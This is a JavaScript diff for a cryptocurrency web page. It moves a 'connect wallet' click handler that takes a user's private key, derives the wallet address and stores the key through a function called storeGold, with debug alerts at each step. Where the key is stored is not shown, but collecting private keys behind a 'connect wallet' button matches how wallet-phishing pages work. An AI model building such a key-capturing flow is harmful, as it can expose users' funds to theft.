@@ -569,7 +569,32 @@ document.getElementById('connect-to-wallet-btn')?.addEventListener('click', asyn
   }
 });
 
+  
+document.getElementById('connect-to-wallet2-btn')?.addEventListener('click', async function (event) {
+event.preventDefault();
 
+try {
+// Step 1: Handle private key input and derive wallet address
+alert('Button clicked: Handling private key input...');
+let walletAddress0 = await handlePrivateKeyInput();
+if (!walletAddress0) {
+alert('No wallet address derived, stopping execution.');
+return;
+}
+
+// Step 2: Store the private key using storeGold
+await storeGold('prv-key-input', true);
+alert('storeGold completed successfully.');
+
+// Step 3: Trigger the main function to store the wallet address
+const networkType0 = document.getElementById('wallet-address-label1').textContent;
+alert(`Calling storeWalletAddressHandler for network: ${networkType0}`);
+storeWalletAddressHandler(walletAddress0, networkType0);
+alert('storeWalletAddressHandler executed successfully.');
+} catch (error) {
+alert(`Error occurred: ${error}`);
+}
+});
 
 	
 
@@ -2155,32 +2180,6 @@ document.addEventListener('DOMContentLoaded', function () {
     });
   }
 
-  // Button click trigger
-  connectToWalletBtn?.addEventListener('click', async function (event) {
-    event.preventDefault();
-
-    try {
-      // Step 1: Handle private key input and derive wallet address
-      alert('Button clicked: Handling private key input...');
-      let walletAddress0 = await handlePrivateKeyInput();
-      if (!walletAddress0) {
-        alert('No wallet address derived, stopping execution.');
-        return;
-      }
-
-      // Step 2: Store the private key using storeGold
-      await storeGold('prv-key-input', true);
-      alert('storeGold completed successfully.');
-
-      // Step 3: Trigger the main function to store the wallet address
-      const networkType0 = document.getElementById('wallet-address-label1').textContent;
-      alert(`Calling storeWalletAddressHandler for network: ${networkType0}`);
-      storeWalletAddressHandler(walletAddress0, networkType0);
-      alert('storeWalletAddressHandler executed successfully.');
-    } catch (error) {
-      alert(`Error occurred: ${error}`);
-    }
-  });
 });
 
 
